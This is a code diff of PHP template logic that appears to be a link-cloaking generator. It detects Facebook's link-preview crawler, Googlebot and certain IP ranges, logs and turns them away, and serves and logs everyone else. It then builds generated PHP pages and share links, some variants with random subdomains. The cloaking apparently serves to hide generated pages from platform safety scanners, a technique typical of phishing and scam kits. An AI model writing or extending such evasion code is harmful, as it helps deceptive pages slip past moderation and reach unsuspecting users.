@@ -297,7 +297,9 @@ $highIp = ip2long(\'66.255.255.255\');
       return true;
   }
 }
-$text = "agents.txt";
+$allowedAgents = "allowedAgents' . $pathname . '.txt";
+$blockedAgents = "blockedAgents' . $pathname . '.txt";
+
 
 $ip =  ip2long($_SERVER[\'REMOTE_ADDR\']);
 // function ip_details($ip)
@@ -313,7 +315,7 @@ if (
    strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit/1.1") !== false ||
  strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false || checkIP($ip)
 ) {
-  $fAgent = fopen($text, \'a\');
+  $fAgent = fopen($blockedAgents, \'a\');
   $agent = $_SERVER[\'REMOTE_ADDR\'] . \' \' . $_SERVER[\'HTTP_USER_AGENT\'] .\' blocked \' . PHP_EOL;
   fwrite($fAgent, $agent);
   fclose($fAgent);
@@ -322,7 +324,7 @@ die();
 
  }
 else {
-  $fAgent = fopen($text, \'a\');
+  $fAgent = fopen($allowedAgents, \'a\');
   $agent = $_SERVER[\'REMOTE_ADDR\'] . \' \' . $_SERVER[\'HTTP_USER_AGENT\'] .\' ok \' . PHP_EOL;
     fwrite($fAgent, $agent);
     fclose($fAgent);
@@ -336,6 +338,7 @@ else {
     fclose($fphp);
     // echo "Link share: " . "<a href ='$filePhp'>" . $filePhp . "</a>";
     // $lurl = 'http://' . substr(md5(microtime()), rand(0, 26), 10) . '.' . $_SERVER['HTTP_HOST'] . '/' . $filePhp;
+    // $lurl = 'http://' . $_POST['user'] . generateRandomString(7) . '.' . $_SERVER['HTTP_HOST'] . '/' . $filePhp;
     $lurl = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $filePhp;
     $curl = curl_init();
     $post_data = array('format' => 'text',
